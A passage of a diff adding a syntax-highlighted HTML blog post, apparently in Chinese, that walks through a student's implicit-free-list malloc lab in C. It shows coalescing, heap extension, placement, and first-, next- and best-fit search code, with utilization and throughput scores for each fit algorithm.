+    size_t prev_alloc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GET_ALLOC(FTRP(PREV_BLKP(bp)));
+    size_t next_alloc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GET_ALLOC(HDRP(NEXT_BLKP(bp)));
+
+    size_t size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GET_SIZE(HDRP(bp));
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (prev_alloc &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; next_alloc)
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; bp;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;next_alloc &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; prev_alloc) {
+        size &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; GET_SIZE(HDRP(NEXT_BLKP(bp)));
+        PUT(FTRP(NEXT_BLKP(bp)), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
+        PUT(HDRP(bp), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
+    }
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;prev_alloc &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; next_alloc) {
+        size &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; GET_SIZE(FTRP(PREV_BLKP(bp)));
+        PUT(HDRP(PREV_BLKP(bp)), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
+        PUT(FTRP(bp), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
+        bp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; PREV_BLKP(bp);
+    }
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;prev_alloc &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;next_alloc) {
+        size &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; GET_SIZE(FTRP(PREV_BLKP(bp)));
+        size &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; GET_SIZE(HDRP(NEXT_BLKP(bp)));
+        PUT(HDRP(PREV_BLKP(bp)), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
+        PUT(FTRP(NEXT_BLKP(bp)), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
+        bp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; PREV_BLKP(bp);
+    };
+
+&lt;span style=&#34;color:#75715e&#34;&gt;#if FIT_ALGO == NEXT_FIT
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (cur_listp &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; bp &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; cur_listp &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; NEXT_BLKP(bp))
+        cur_listp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bp;
+&lt;span style=&#34;color:#75715e&#34;&gt;#endif
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; bp;
+}
+
+&lt;span style=&#34;color:#75715e&#34;&gt;/*
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * extend_heap - extend heap with a free block
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;extend_heap&lt;/span&gt;(size_t words) {
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;bp;
+    size_t size;
+    &lt;span style=&#34;color:#75715e&#34;&gt;/* Allocate and even number of words to maintain alignment */&lt;/span&gt;
+    size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (words &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt; (words &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; WSIZE : words &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; WSIZE;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ((&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;)(bp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; mem_sbrk(size)) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
+
+    &lt;span style=&#34;color:#75715e&#34;&gt;/* Initialize free block header/footer and the epilogue header */&lt;/span&gt;
+    PUT(HDRP(bp), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
+    PUT(FTRP(bp), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
+    PUT(HDRP(NEXT_BLKP(bp)), PACK(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;));
+
+    &lt;span style=&#34;color:#75715e&#34;&gt;/* Coalesce if the previous block was free */&lt;/span&gt;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; coalesce(bp);
+}
+
+&lt;span style=&#34;color:#75715e&#34;&gt;/* 
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * mm_init - initialize the malloc package.
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;mm_init&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;)
+{
+    &lt;span style=&#34;color:#75715e&#34;&gt;/* Create the initial empty heap */&lt;/span&gt;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ((heap_listp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; mem_sbrk(&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; WSIZE)) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)   &lt;span style=&#34;color:#75715e&#34;&gt;/* sbrk() function returns the start address of the new area. */&lt;/span&gt;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
+    PUT(heap_listp, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);                                     &lt;span style=&#34;color:#75715e&#34;&gt;/* Alignment */&lt;/span&gt;
+    PUT(heap_listp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; WSIZE), PACK(DSIZE, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;));          &lt;span style=&#34;color:#75715e&#34;&gt;/* Prologue block&amp;#39;s size is 8 and is always alloced */&lt;/span&gt;
+    PUT(heap_listp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; WSIZE), PACK(DSIZE, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;));
+    PUT(heap_listp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; WSIZE), PACK(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;));              &lt;span style=&#34;color:#75715e&#34;&gt;/* Epilogue header */&lt;/span&gt;
+    heap_listp &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; WSIZE);
+    
+&lt;span style=&#34;color:#75715e&#34;&gt;#if FIT_ALGO == NEXT_FIT
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    cur_listp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; heap_listp;
+&lt;span style=&#34;color:#75715e&#34;&gt;#endif
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (extend_heap(CHUNKSIZE&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;WSIZE) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; NULL)
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+}
+
+&lt;span style=&#34;color:#75715e&#34;&gt;/* 
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * mm_malloc - Allocate a block by incrementing the brk pointer.
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *     Always allocate a block whose size is a multiple of the alignment.
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;mm_malloc&lt;/span&gt;(size_t size)
+{
+    &lt;span style=&#34;color:#75715e&#34;&gt;/* Ignore spurious requests */&lt;/span&gt;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; DSIZE)
+        size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; DSIZE;
+    size_t newsize &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; size &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; DSIZE &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; ((&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;size) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; DSIZE);
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; bp;
+    &lt;span style=&#34;color:#75715e&#34;&gt;// int newsize = ALIGN(size + SIZE_T_SIZE);
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ((bp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; find_fit(newsize)) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; NULL) {
+        place(bp, newsize);
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; bp;
+    }
+    size_t extendsize &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; MAX(newsize, CHUNKSIZE);
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ((bp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; extend_heap(extendsize&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;WSIZE)) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; NULL)
+	   &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
+    place(bp, newsize);
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; bp;
+}
+
+&lt;span style=&#34;color:#75715e&#34;&gt;/*
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * mm_free - Freeing a block does nothing.
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;mm_free&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;ptr)
+{
+    size_t size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GET_SIZE(HDRP(ptr));
+
+    PUT(HDRP(ptr), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
+    PUT(FTRP(ptr), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
+
+    coalesce(ptr);
+}
+
+&lt;span style=&#34;color:#75715e&#34;&gt;/*
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * mm_realloc - Implemented simply in terms of mm_malloc and mm_free
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;mm_realloc&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;ptr, size_t size)
+{
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;oldptr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ptr;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;newptr;
+    size_t copySize;
+    
+    newptr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; mm_malloc(size);
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (newptr &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; NULL)
+      &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
+    size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GET_SIZE(HDRP(oldptr));
+    &lt;span style=&#34;color:#75715e&#34;&gt;// copySize = *(size_t *)((char *)oldptr - SIZE_T_SIZE);
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    copySize &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GET_SIZE(HDRP(newptr));
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; copySize)
+      copySize &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; size;
+    memcpy(newptr, oldptr, copySize &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; WSIZE);
+    mm_free(oldptr);
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; newptr;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;书上最后留了两个函数作为例题&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;place&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;bp, size_t size){
+    size_t origin_size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GET_SIZE(HDRP(bp));
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (origin_size &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; DSIZE) {
+        PUT(HDRP(bp), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;));
+        PUT(FTRP(bp), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;));
+
+        PUT(HDRP(NEXT_BLKP(bp)), PACK(origin_size &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
+        PUT(FTRP(NEXT_BLKP(bp)), PACK(origin_size &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
+    } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
+        PUT(HDRP(bp), PACK(origin_size, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;));
+        PUT(FTRP(bp), PACK(origin_size, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;));
+    }
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;实现了三种不同的 fit 算法：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* 
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * util: 74%
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * secs: 0.4585
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * Perf index = 44 (util) + 16 (thru) = 61 / 100
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#if FIT_ALGO == FIRST_FIT
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;find_fit&lt;/span&gt;(size_t size) {
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;tmp_listp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; heap_listp;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (GET_SIZE(HDRP(tmp_listp)) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; size &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; GET_ALLOC(HDRP(tmp_listp))) {
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (GET_SIZE(HDRP(tmp_listp)) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) {
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
+        }
+        tmp_listp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NEXT_BLKP(tmp_listp);
+    }
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; tmp_listp;
+}
+&lt;span style=&#34;color:#75715e&#34;&gt;/* 
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * util: 73%
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * secs: 0.0918
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * Perf index = 44 (util) + 40 (thru) = 84/100
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# elif FIT_ALGO == NEXT_FIT
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;find_fit&lt;/span&gt;(size_t size) {
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;tmp_listp;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (tmp_listp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; cur_listp; GET_SIZE(HDRP(tmp_listp)) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; tmp_listp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NEXT_BLKP(tmp_listp)) {
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;GET_ALLOC(HDRP(tmp_listp)) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; GET_SIZE(HDRP(tmp_listp)) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; size) {
+            cur_listp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; tmp_listp;
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; tmp_listp;
+        }
+    }
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (tmp_listp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; heap_listp; tmp_listp &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; cur_listp; tmp_listp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NEXT_BLKP(tmp_listp)) {
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;GET_ALLOC(HDRP(tmp_listp)) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; GET_SIZE(HDRP(tmp_listp)) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; size) {
+            cur_listp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; tmp_listp;
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; tmp_listp;
+        }
+    }
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
+}
+&lt;span style=&#34;color:#75715e&#34;&gt;/*
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * util: 75%
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * secs: 0.4660
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * Perf index = 45 (util) + 16 (thru) = 61/100
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# elif FIT_ALGO == BEST_FIT
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;find_fit&lt;/span&gt;(size_t size) {
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;best_listp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
+    size_t best_size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7fffffff&lt;/span&gt;;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;tmp_listp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; heap_listp; GET_SIZE(HDRP(tmp_listp)) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; tmp_listp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NEXT_BLKP(tmp_listp)) {
+        size_t cur_size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GET_SIZE(HDRP(tmp_listp));
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;GET_ALLOC(HDRP(tmp_listp)) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; cur_size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; size) {
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (cur_size &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; size) {
+                &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; tmp_listp;
+            }
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (cur_size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; best_size) {
+                best_size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; cur_size;
